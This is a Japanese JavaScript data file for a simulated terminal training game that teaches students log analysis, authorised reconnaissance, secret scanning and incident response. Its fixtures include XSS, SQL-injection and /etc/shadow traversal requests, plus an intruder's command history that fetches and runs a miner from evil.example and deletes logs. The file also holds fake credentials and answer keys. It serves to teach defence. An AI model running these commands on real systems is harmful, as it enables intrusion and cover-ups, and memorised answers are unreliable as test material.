/* =========================================================
   ターミナル演習のデータ
   - fs      : 仮想ファイルシステム（オブジェクト＝フォルダ、文字列＝ファイル）
   - goals   : 目標。順番にクリアしていく
       type "cmd"    : test(ctx) が true を返すコマンドを実行したら達成
       type "answer" : submit <答え> で answers のどれかと一致したら達成
   - net     : 仮想ネットワーク（nmap / ping / curl 用）
   - custom  : そのミッションだけで使える特別なコマンド
   本物のコンピューターやネットワークには一切つながりません。
   ========================================================= */

const HOME = "/home/whitehat";

// アクセスログ（ミッション2）を組み立てる
const T2_LOG = (() => {
  const L = [];
  const add = (ip, time, req, code) => L.push(`${ip} - - [06/Nov/2026:${time}] "${req} HTTP/1.1" ${code}`);
  add("10.0.0.5", "09:58:12", "GET /index.html", 200);
  add("10.0.0.8", "09:58:30", "GET /news", 200);
  add("10.0.0.12", "09:59:05", "GET /about", 200);
  add("10.0.0.5", "10:00:41", "GET /club/baseball", 200);
  add("10.0.0.8", "10:01:15", "GET /favicon.ico", 404);
  for (let i = 1; i <= 12; i++) add("203.0.113.77", `10:02:${String(i).padStart(2, "0")}`, "POST /login user=admin", 401);
  add("203.0.113.77", "10:02:13", "POST /login user=admin", 200);
  add("203.0.113.77", "10:02:20", "GET /admin/users", 200);
  add("10.0.0.12", "10:03:02", "GET /news/2026-11", 200);
  add("198.51.100.23", "10:05:10", "GET /search?q=<script>alert(1)</script>", 200);
  add("198.51.100.23", "10:05:14", "GET /search?q=' OR 1=1 --", 500);
  add("10.0.0.5", "10:05:30", "GET /contact", 200);
  add("198.51.100.23", "10:05:41", "GET /download?file=../../../etc/shadow", 200);
  add("198.51.100.23", "10:05:55", "GET /admin", 403);
  add("10.0.0.8", "10:06:20", "GET /index.html", 200);
  return L.join("\n");
})();

const TERMINAL_MISSIONS = [
  /* ---------------- 1. 基本操作 ---------------- */
  {
    id: "t1", level: "入門", title: "はじめてのターミナル：置き忘れたファイル",
    learn: "ls / ls -a / cd / cat / pwd",
    host: "festival-web",
    story: "文化祭サイトのサーバーに、開発者が秘密のファイルを置き忘れたらしい。サーバーにログインできるので、ターミナルで中を調べてみよう。",
    fs: {
      home: { whitehat: {
        "readme.txt": "文化祭サイトのサーバーへようこそ。\n開発者がサーバーに秘密のファイルを置き忘れたらしい。\nまずは周りを見回してみよう。\n\nヒント：名前が「.」で始まるファイルは「隠しファイル」。\n普通の ls では表示されない。",
        "notes.txt": "TODO: 本番公開の前に設定ファイルを消すこと！",
        site: {
          "index.html": "<h1>まなび祭 2026</h1>\n<p>11月20日・21日開催！</p>",
          "style.css": "body { background: #fffbe6; }",
        },
        ".env": "# データベースの設定（公開しないこと）\nDB_USER=festival\nDB_PASSWORD=Matsuri2026!\nDEBUG=true",
      } },
    },
    chips: ["ls", "ls -a", "cat ", "cd ", "cd ..", "pwd", "submit ", "hint", "help"],
    goals: [
      { type: "cmd", text: "ls と入力して Enter。今いるフォルダの中身を見よう。", hint: "そのまま「ls」と打って Enter キー。", test: c => c.cmd === "ls",
        explain: "ls（list）は、今いるフォルダの中身を一覧表示するコマンド。名前の後ろに / が付いているものはフォルダです。" },
      { type: "cmd", text: "cat readme.txt で、readme.txt の中身を読もう。", hint: "「cat readme.txt」と打つ。ファイル名は Tab キーで補完できる。", test: c => c.cmd === "cat" && c.paths.includes(HOME + "/readme.txt"),
        explain: "cat は、ファイルの中身を表示するコマンド。" },
      { type: "cmd", text: "cd site で site フォルダに入り、ls で中身を見よう。", hint: "「cd site」で移動してから「ls」。今いる場所は pwd で確認できる。", test: c => c.cmd === "ls" && (c.target === HOME + "/site"),
        explain: "cd（change directory）はフォルダを移動するコマンド。「cd ..」で1つ上に戻れる。pwd で今いる場所を表示できる。" },
      { type: "cmd", text: "cd .. でホームに戻り、ls -a で隠しファイルを探そう。", hint: "「cd ..」で戻ってから「ls -a」。", test: c => c.cmd === "ls" && c.flags.has("a") && c.target === HOME,
        explain: "-a オプションを付けると、「.」で始まる隠しファイルも表示される。設定ファイルは隠しファイルになっていることが多い。" },
      { type: "answer", text: "隠しファイルの中にある、データベースのパスワードを見つけよう。見つけたら submit パスワード で報告。", hint: "cat .env で中身を見てみよう。DB_PASSWORD= の後ろがパスワード。", answers: ["Matsuri2026!"],
        explain: "本番サーバーに .env が残っていると、Webから読まれてデータベースに侵入される危険がある。公開前に不要なファイルは必ず消そう。" },
    ],
    summary: "ls・cd・cat はターミナルの基本中の基本。そして「隠しファイル」に大事な情報が入っていることが多いのも覚えておこう。",
  },

  /* ---------------- 2. ログ調査 ---------------- */
  {
    id: "t2", level: "初級", title: "ログから攻撃者を探せ",
    learn: "head / grep / | （パイプ） / wc -l",
    host: "manabi-web",
    story: "学校のWebサーバーに不審なアクセスがあった。アクセスログ（access.log）から、攻撃者の正体と手口を突き止めよう。",
    fs: {
      home: { whitehat: {
        "access.log": T2_LOG,
        "readme.txt": "access.log … Webサーバーのアクセス記録\n\n書式：IPアドレス - - [日時] \"リクエスト\" ステータスコード\n200=成功 401=ログイン失敗 403=禁止 404=なし 500=サーバーエラー",
      } },
    },
    chips: ["head access.log", "grep ", "| wc -l", "| grep ", "cat readme.txt", "submit ", "hint", "help"],
    goals: [
      { type: "cmd", text: "head access.log で、ログの最初の10行を見てみよう。", hint: "「head access.log」と打つ。ログの読み方は cat readme.txt でも確認できる。", test: c => (c.cmd === "head" || c.cmd === "cat") && c.paths.includes(HOME + "/access.log"),
        explain: "head はファイルの先頭だけを表示するコマンド（tail なら最後）。長いログは cat だと読みにくいので head や tail を使う。" },
      { type: "cmd", text: "grep 401 access.log で、ログイン失敗（401）の行だけを取り出そう。", hint: "「grep 401 access.log」と打つ。", test: c => c.cmd === "grep" && c.args.includes("401"),
        explain: "grep は、指定した文字を含む行だけを取り出すコマンド。大量のログから必要な行を探すときに大活躍する。" },
      { type: "answer", text: "ログイン失敗を何度も繰り返している攻撃者のIPアドレスを submit しよう。", hint: "grep 401 access.log の結果で、同じIPアドレスが何度も出てくるはず。", answers: ["203.0.113.77"],
        explain: "短時間に同じIPからログイン失敗が続くのは、パスワード総当たり攻撃（ブルートフォース）の典型的な痕跡。" },
      { type: "answer", text: "そのIPからのログイン失敗は何回？ grep 203.0.113.77 access.log | grep 401 | wc -l で数えよう。", hint: "「|」（パイプ）は、前のコマンドの結果を次のコマンドに渡す記号。wc -l は行数を数える。", answers: ["12", "12回"],
        explain: "パイプ（|）でコマンドをつなげると、「絞り込んで→さらに絞り込んで→数える」ができる。ちなみに 401 で絞らないと13行になる。最後の1行はステータス200…つまりログインに成功されている！" },
      { type: "answer", text: "別のIPが「../」を使ったディレクトリトラバーサルを試している。grep で「..」を探して、狙われたファイルのフルパスを submit しよう。（例：/etc/xxxx）", hint: "grep .. access.log で探してみよう。file= の後ろの ../ を取り除くと…？", answers: ["/etc/shadow", "etc/shadow"],
        explain: "/etc/shadow は、Linuxのパスワードのハッシュが保存された超重要ファイル。" },
      { type: "answer", text: "その攻撃は成功した？ その行のステータスコードを submit しよう。", hint: "行の一番最後の数字。200なら成功、403や404なら失敗。", answers: ["200"],
        explain: "ステータス200＝成功。重要ファイルが盗まれた可能性が高い。すぐに管理者に報告し、機能を止める必要がある緊急事態だ。" },
    ],
    summary: "ログ調査の基本は「grep で絞り込む → パイプでつなぐ → 数える」。本物のセキュリティ担当者も毎日こうやってログを調べている。",
  },

  /* ---------------- 3. 偵察 ---------------- */
  {
    id: "t3", level: "中級", title: "サーバーを偵察せよ",
    learn: "ping / nmap / curl / robots.txt",
    host: "whitehat-pc",
    story: "まなび高校から、Webサーバーの脆弱性診断を正式に依頼された。外から見て危ないところがないか、攻撃者と同じ目線で調べてみよう。",
    scope: ["192.168.10.5"],
    net: {
      "192.168.10.5": {
        name: "manabi-web",
        ports: [
          { port: 22, service: "ssh", version: "OpenSSH 7.6p1" },
          { port: 23, service: "telnet", version: "Linux telnetd" },
          { port: 80, service: "http", version: "Apache httpd 2.4.29" },
          { port: 3306, service: "mysql", version: "MySQL 5.7.21" },
        ],
        web: {
          "/": "<html>\n<head><title>まなび高校</title></head>\n<body>\n  <h1>まなび高校へようこそ</h1>\n  <!-- TODO: バックアップの場所は robots.txt に書いておいた -->\n</body>\n</html>",
          "/robots.txt": "User-agent: *\nDisallow: /admin/\nDisallow: /backup/",
          "/backup/": "Index of /backup/\n\n  config.bak     2019-04-01 10:00   1.2K\n  db_2019.sql    2019-04-01 10:00   88M",
          "/backup/config.bak": "# 管理画面の設定（旧サーバーからコピー）\nadmin_user=admin\nadmin_pass=Kanri@2019",
          "/admin/": "401 Unauthorized - ログインが必要です",
        },
      },
    },
    fs: {
      home: { whitehat: {
        "readme.txt": "【脆弱性診断 許可書】No. WH-2026-015\n依頼主：まなび高校\n診断対象：192.168.10.5（Webサーバー）のみ\n\n※許可されていないIPアドレスを調べることは禁止。\n  勝手に調べると不正アクセス禁止法などの法律違反になる。",
      } },
    },
    chips: ["cat readme.txt", "ping 192.168.10.5", "nmap 192.168.10.5", "nmap -sV 192.168.10.5", "curl http://192.168.10.5/", "submit ", "hint", "help"],
    goals: [
      { type: "cmd", text: "まずは cat readme.txt で、診断してよい範囲（許可書）を確認しよう。", hint: "「cat readme.txt」と打つ。", test: c => c.cmd === "cat" && c.paths.includes(HOME + "/readme.txt"),
        explain: "ホワイトハッカーの最初の仕事は「どこまで調べてよいか」の確認。許可された範囲の外を調べたら、それはもう攻撃だ。" },
      { type: "cmd", text: "ping 192.168.10.5 で、診断対象のサーバーが動いているか確認しよう。", hint: "「ping 192.168.10.5」と打つ。", test: c => c.cmd === "ping" && c.args.includes("192.168.10.5"),
        explain: "ping は、相手のコンピューターに「生きてる？」と小さなデータを送って返事を確かめるコマンド。" },
      { type: "cmd", text: "nmap 192.168.10.5 で、開いているポート（通信の出入口）を調べよう。", hint: "「nmap 192.168.10.5」と打つ。", test: c => c.cmd === "nmap" && c.args.includes("192.168.10.5"),
        explain: "nmap はポートスキャンをするツール。どんなサービスが動いているかが分かる。攻撃者も最初にこれをやる。-sV を付けるとバージョンも分かる。" },
      { type: "answer", text: "暗号化されず、パスワードを盗み見られる危険なリモートログイン用のポート番号を submit しよう。", hint: "nmap の結果で、telnet が使っているポート番号は？", answers: ["23", "23/tcp"],
        explain: "Telnet（23番）は通信が暗号化されない。代わりに暗号化された SSH（22番）を使うべき。" },
      { type: "answer", text: "インターネットに公開してはいけない、データベースのポート番号を submit しよう。", hint: "nmap の結果で、mysql が使っているポート番号は？", answers: ["3306", "3306/tcp"],
        explain: "データベースは外部から直接触れないようにするのが基本。ファイアウォールで閉じるべき。" },
      { type: "cmd", text: "Webサーバーも調べよう。curl http://192.168.10.5/ でトップページのHTMLを見てみよう。", hint: "「curl http://192.168.10.5/」と打つ。", test: c => c.cmd === "curl" && /192\.168\.10\.5\/?$/.test(c.args.find(a => a.includes("192.168.10.5")) || ""),
        explain: "curl は、ブラウザの代わりにWebページを取得するコマンド。HTMLのコメント（<!-- -->）は画面に表示されないが、誰でも読める。" },
      { type: "cmd", text: "HTMLのコメントにあったヒントに従い、curl で robots.txt を見てみよう。", hint: "「curl http://192.168.10.5/robots.txt」と打つ。", test: c => c.cmd === "curl" && c.args.some(a => a.includes("robots.txt")),
        explain: "robots.txt は検索エンジンに「ここは載せないで」と伝えるファイル。でも誰でも読めるので、隠したい場所を書くと逆に攻撃者に教えることになる。" },
      { type: "answer", text: "robots.txt に書かれていた /backup/ を curl で調べ、置き忘れられたファイルから管理者のパスワードを見つけて submit しよう。", hint: "curl http://192.168.10.5/backup/ でファイル一覧が見える。その中のファイルも curl で開いてみよう。", answers: ["Kanri@2019"],
        explain: "公開フォルダにバックアップを置くのは危険。robots.txt は「立入禁止の看板」なだけで、鍵ではない。ここまで分かったら、依頼主に報告書を出して直してもらおう。" },
    ],
    summary: "攻撃者は「ポートスキャン → Webの調査 → 置き忘れの発見」の順で弱点を探す。ホワイトハッカーは、それを許可された範囲で先にやって、穴をふさいでもらう。",
  },

  /* ---------------- 4. ソースコード調査 ---------------- */
  {
    id: "t4", level: "中級", title: "ソースコードから秘密を探せ",
    learn: "find / grep -r / git log / git show",
    host: "dev-pc",
    story: "部活動アプリのソースコードをGitHubで公開する前に、秘密情報が混ざっていないかチェックしてほしいと頼まれた。",
    fs: {
      home: { whitehat: {
        "readme.txt": "app/ … チェックするアプリのソースコード（Gitで管理されている）\n\n調べること：\n1. コードの中にパスワードやAPIキーが書かれていないか\n2. Gitの履歴に秘密情報が残っていないか",
        app: {
          "README.md": "# 部活動アプリ\n部活の連絡をまとめるアプリです。",
          "package.json": "{\n  \"name\": \"club-app\",\n  \"version\": \"1.0.0\"\n}",
          ".gitignore": "node_modules/",
          src: {
            "index.js": "const api = require(\"./api\");\nconst utils = require(\"./utils\");\napi.start();",
            "api.js": "// 外部APIとの通信\nconst API_URL = \"https://api.club-app.example\";\nconst API_KEY = \"sk_live_51Hx9QmanabiSECRET\";\nfunction start() {\n  fetch(API_URL + \"/news?key=\" + API_KEY);\n}\nmodule.exports = { start };",
            "utils.js": "function formatDate(d) {\n  return d.toLocaleDateString(\"ja-JP\");\n}\nmodule.exports = { formatDate };",
          },
          public: {
            "index.html": "<h1>部活動アプリ</h1>\n<script src=\"bundle.js\"></script>",
          },
        },
      } },
    },
    git: {
      root: HOME + "/app",
      log: [
        { hash: "e7a91c2", msg: "APIの設定を追加", date: "2026-10-30" },
        { hash: "3b8d0f4", msg: ".envを削除", date: "2026-10-28" },
        { hash: "9c4e2a1", msg: "メール送信機能を追加（.envも追加）", date: "2026-10-27" },
        { hash: "1f0d3b7", msg: "最初のコミット", date: "2026-10-20" },
      ],
      show: {
        e7a91c2: "diff --git a/src/api.js b/src/api.js\n+const API_KEY = \"sk_live_51Hx9QmanabiSECRET\";",
        "3b8d0f4": "diff --git a/.env b/.env\ndeleted file mode 100644\n-MAIL_USER=info@club-app.example\n-MAIL_PASSWORD=Yuubin#777",
        "9c4e2a1": "diff --git a/.env b/.env\nnew file mode 100644\n+MAIL_USER=info@club-app.example\n+MAIL_PASSWORD=Yuubin#777\ndiff --git a/src/mail.js b/src/mail.js\n+require(\"dotenv\").config();",
        "1f0d3b7": "diff --git a/README.md b/README.md\n+# 部活動アプリ",
      },
    },
    chips: ["cd app", "find . -name \"*.js\"", "grep -r API_KEY .", "git log", "git show ", "submit ", "hint", "help"],
    goals: [
      { type: "cmd", text: "cd app でアプリのフォルダに入り、find . -name \"*.js\" でJavaScriptのファイルを全部探そう。", hint: "「cd app」のあと「find . -name \"*.js\"」。* は「何でもいい」という意味。", test: c => c.cmd === "find" && c.args.includes("-name"),
        explain: "find はファイルを探すコマンド。-name で名前を指定できる。*.js は「.js で終わる全部」という意味（ワイルドカード）。" },
      { type: "cmd", text: "grep -r API_KEY . で、フォルダの中の全ファイルから「API_KEY」を探そう。", hint: "「grep -r API_KEY .」と打つ。最後の . は「今いるフォルダ」。", test: c => c.cmd === "grep" && c.flags.has("r"),
        explain: "grep に -r を付けると、フォルダの中の全ファイルをまとめて検索できる。秘密情報のチェックによく使う方法。" },
      { type: "answer", text: "本番用のAPIキーが直接書かれているファイルの名前を submit しよう。（例：xxx.js）", hint: "grep -r の結果は「ファイルのパス:見つかった行」の形で表示される。", answers: ["api.js", "src/api.js", "./src/api.js", "app/src/api.js"],
        explain: "APIキーをコードに直接書く（ハードコード）と、公開した瞬間に盗まれる。環境変数などに分けて管理しよう。" },
      { type: "cmd", text: "次はGitの履歴を調べる。git log でこれまでのコミット（変更の記録）を見よう。", hint: "app フォルダの中で「git log」と打つ。", test: c => c.cmd === "git" && c.args[0] === "log",
        explain: "git log は、いつ・誰が・何を変更したかの履歴を表示する。Gitは過去のすべての状態を覚えている。" },
      { type: "answer", text: "履歴に「.envを追加」して「削除」した跡がある。git show コミット番号 で中身を見て、メールのパスワードを submit しよう。", hint: "「git show 9c4e2a1」のように、コミット番号を指定する。", answers: ["Yuubin#777"],
        explain: "ファイルを消しても、Gitの履歴にはずっと残る。公開リポジトリなら誰でも過去のコミットを見られる。" },
      { type: "answer", text: "最後の質問。秘密情報が漏れていると分かったとき、最初にやるべきことは？ 番号を submit しよう。\n  1: その行を消してコミットする\n  2: キーやパスワードを無効化・変更する\n  3: 誰も見ていないはずなので放置する", hint: "消しても履歴に残るし、すでにコピーされているかもしれない…", answers: ["2"],
        explain: "まずは漏れた鍵そのものを使えなくするのが最優先。そのあとで .gitignore に .env を追加し、履歴の削除も検討する。" },
    ],
    summary: "公開前の「秘密情報チェック」は、grep -r とGitの履歴調査が基本。漏れたらまず無効化、を忘れずに。",
  },

  /* ---------------- 5. インシデント対応 ---------------- */
  {
    id: "t5", level: "上級", title: "侵入者を追跡せよ",
    learn: "ログ調査 / find / 遮断・パスワード変更・報告",
    host: "manabi-web",
    story: "緊急事態！ 夜中に学校のサーバーへ何者かが侵入した。足取りを突き止め、被害を食い止め、報告するまでがホワイトハッカーの仕事だ。",
    fs: {
      home: {
        whitehat: {
          "readme.txt": "【緊急】サーバーに侵入された可能性あり\n\n手がかり：\n・ログイン記録は /var/log/auth.log にある\n・各ユーザーのコマンド履歴は、ホームフォルダの .bash_history にある\n\n注意：証拠となるファイルは消さないこと！",
        },
        admin: {
          ".bash_history": "cd /tmp\nmkdir .x\ncd .x\nwget http://evil.example/miner.sh\nchmod +x miner.sh\n./miner.sh &\nrm /var/log/nginx/access.log\nexit",
        },
        teacher: {
          "memo.txt": "来週の授業：ネットワークの基礎",
        },
      },
      var: { log: {
        "auth.log": [
          "Nov  6 02:10:01 manabi-web sshd: Accepted publickey for teacher from 10.0.0.12",
          "Nov  6 02:14:22 manabi-web sshd: Failed password for root from 45.33.10.8",
          "Nov  6 02:14:23 manabi-web sshd: Failed password for root from 45.33.10.8",
          "Nov  6 02:14:24 manabi-web sshd: Failed password for invalid user test from 45.33.10.8",
          "Nov  6 02:14:25 manabi-web sshd: Failed password for admin from 45.33.10.8",
          "Nov  6 02:14:26 manabi-web sshd: Failed password for admin from 45.33.10.8",
          "Nov  6 02:15:10 manabi-web sshd: Accepted password for admin from 45.33.10.8",
          "Nov  6 02:15:40 manabi-web sudo: admin : COMMAND=/usr/bin/wget http://evil.example/miner.sh",
          "Nov  6 02:16:02 manabi-web sudo: admin : COMMAND=/bin/rm /var/log/nginx/access.log",
          "Nov  6 08:30:15 manabi-web sshd: Accepted publickey for teacher from 10.0.0.12",
        ].join("\n"),
        "syslog": "Nov  6 02:16:30 manabi-web kernel: CPU使用率 100% が続いています",
        nginx: { "error.log": "" },
      } },
      tmp: {
        ".x": { "miner.sh": "#!/bin/sh\n# 仮想通貨を勝手に採掘するプログラム（マイナー）\nwhile true; do mine --pool evil.example; done" },
        "session.tmp": "",
      },
    },
    chips: ["cat readme.txt", "cd /var/log", "ls", "grep Accepted auth.log", "cat /home/admin/.bash_history", "find / -name ", "submit ", "hint"],
    goals: [
      { type: "cmd", text: "cat readme.txt で状況を確認したら、cd /var/log でログのフォルダに移動して ls しよう。", hint: "「cd /var/log」のあと「ls」。/ から始まる場所の指定を「絶対パス」という。", test: c => c.cmd === "ls" && c.target === "/var/log",
        explain: "Linuxでは、ログは /var/log に集められている。auth.log はログイン（認証）の記録。" },
      { type: "answer", text: "auth.log を調べて、ログインに成功した侵入者のIPアドレスを submit しよう。", hint: "grep Accepted auth.log で、ログイン成功の行だけを見よう。校内（10.0.0.x）ではないIPは？", answers: ["45.33.10.8"],
        explain: "Failed（失敗）の連続のあとに Accepted（成功）。パスワード総当たりで侵入されたことが分かる。" },
      { type: "answer", text: "侵入者に乗っ取られたアカウント名を submit しよう。", hint: "そのIPから「Accepted password for ○○」となっている行の○○。", answers: ["admin"],
        explain: "admin のパスワードが弱かったため、総当たりで破られてしまった。" },
      { type: "answer", text: "侵入者は admin のコマンド履歴を消し忘れていた。/home/admin/.bash_history を読んで、ダウンロードされた不正なファイルの名前を submit しよう。", hint: "cat /home/admin/.bash_history で読める。wget はファイルをダウンロードするコマンド。", answers: ["miner.sh"],
        explain: "侵入者はマイナー（他人のコンピューターで勝手に仮想通貨を採掘するプログラム）を仕掛け、アクセスログまで消して証拠を隠そうとしていた。" },
      { type: "cmd", text: "find / -name miner.sh で、不正なファイルが今どこにあるか探そう。", hint: "「find / -name miner.sh」と打つ。/ はコンピューター全体の一番上の場所。", test: c => c.cmd === "find" && c.args.includes("miner.sh"),
        explain: "「.」で始まる隠しフォルダ（/tmp/.x）に隠されていた。侵入者はよく隠しフォルダを使う。見つけても、すぐには消さずに証拠として保全する。" },
      { type: "cmd", text: "被害を食い止めよう。block 45.33.10.8 で、侵入者のIPアドレスからの通信を遮断しよう。", hint: "「block 45.33.10.8」と打つ。", test: c => c.cmd === "block" && c.args.includes("45.33.10.8"),
        explain: "まずは被害の拡大を防ぐ（封じ込め）。攻撃元からの通信を遮断した。" },
      { type: "cmd", text: "passwd admin で、乗っ取られたアカウントのパスワードを変更しよう。", hint: "「passwd admin」と打つ。", test: c => c.cmd === "passwd" && c.args.includes("admin"),
        explain: "破られたパスワードはすぐに変更。可能なら、パスワード認証をやめて鍵認証にし、root/adminへの直接ログインも禁止する。" },
      { type: "cmd", text: "最後に report と入力して、調査結果を管理者に報告しよう。", hint: "「report」と打つ。", test: c => c.cmd === "report",
        explain: "検知 → 調査 → 封じ込め → 報告。これがインシデント対応の流れ。報告して初めて、組織として再発防止に取り組める。" },
    ],
    summary: "侵入の痕跡はログ・コマンド履歴・隠しファイルに残る。証拠は消さず、封じ込めて、必ず報告する。これで君も一人前のホワイトハッカーだ！",
    custom: {
      block: (args, st) => {
        const ip = args[0];
        if (!ip) return "使い方: block <IPアドレス>";
        if (ip.startsWith("10.")) return `⚠ ${ip} は校内のIPアドレスです。先生のPCを遮断してしまいます！`;
        st.blocked = ip;
        return `[ファイアウォール] ${ip} からの通信を遮断しました。`;
      },
      passwd: (args, st) => {
        const u = args[0] || "whitehat";
        st.passwd = u;
        return `ユーザー ${u} の新しいパスワードを設定しました（シミュレーション）。\n※ 長く、推測されにくく、他で使っていないパスワードにしよう。`;
      },
      report: (args, st) => [
        "========== インシデント報告書 ==========",
        "発生日時 : 11月6日 02:14 〜 02:16",
        "攻撃元   : 45.33.10.8",
        "原因     : admin アカウントへのパスワード総当たり攻撃",
        "被害     : 不正プログラム（/tmp/.x/miner.sh）の設置、アクセスログの削除",
        `対応     : ${st.blocked ? "攻撃元IPの遮断 済" : "攻撃元IPの遮断 未"} ／ ${st.passwd === "admin" ? "adminのパスワード変更 済" : "adminのパスワード変更 未"}`,
        "今後     : 鍵認証への切り替え、ログの別サーバー保存、不正プログラムの解析",
        "=======================================",
        "管理者に報告しました。",
      ].join("\n"),
    },
  },
];

/* コマンド早見表（help と早見表で使う） */
const COMMAND_HELP = [
  { cmd: "ls", desc: "フォルダの中身を表示", ex: "ls / ls -a（隠しファイルも）/ ls -l（詳しく）" },
  { cmd: "cd", desc: "フォルダを移動", ex: "cd site / cd ..（1つ上）/ cd（ホームへ）" },
  { cmd: "pwd", desc: "今いる場所を表示", ex: "pwd" },
  { cmd: "cat", desc: "ファイルの中身を表示", ex: "cat readme.txt" },
  { cmd: "head / tail", desc: "ファイルの最初 / 最後だけ表示", ex: "head access.log / tail -n 5 access.log" },
  { cmd: "grep", desc: "文字を含む行を探す", ex: "grep 401 access.log / grep -i / grep -r API_KEY ." },
  { cmd: "wc -l", desc: "行数を数える", ex: "grep 401 access.log | wc -l" },
  { cmd: "sort / uniq -c", desc: "並べ替え / 重複を数える", ex: "grep Failed auth.log | sort | uniq -c" },
  { cmd: "find", desc: "ファイルを探す", ex: "find . -name \"*.js\" / find / -name miner.sh" },
  { cmd: "|（パイプ）", desc: "前の結果を次のコマンドに渡す", ex: "grep 203.0.113.77 access.log | grep 401" },
  { cmd: "ping", desc: "相手が動いているか確認", ex: "ping 192.168.10.5" },
  { cmd: "nmap", desc: "開いているポートを調べる", ex: "nmap 192.168.10.5 / nmap -sV（バージョンも）" },
  { cmd: "curl", desc: "Webページを取得", ex: "curl http://192.168.10.5/robots.txt" },
  { cmd: "git", desc: "変更履歴を調べる", ex: "git log / git show 9c4e2a1" },
  { cmd: "submit", desc: "見つけた答えを報告", ex: "submit 203.0.113.77" },
  { cmd: "hint", desc: "今の目標のヒントを見る", ex: "hint" },
  { cmd: "man", desc: "コマンドの説明を見る", ex: "man grep" },
  { cmd: "clear", desc: "画面をきれいにする", ex: "clear（↑↓キーで過去のコマンド、Tabキーで補完）" },
];
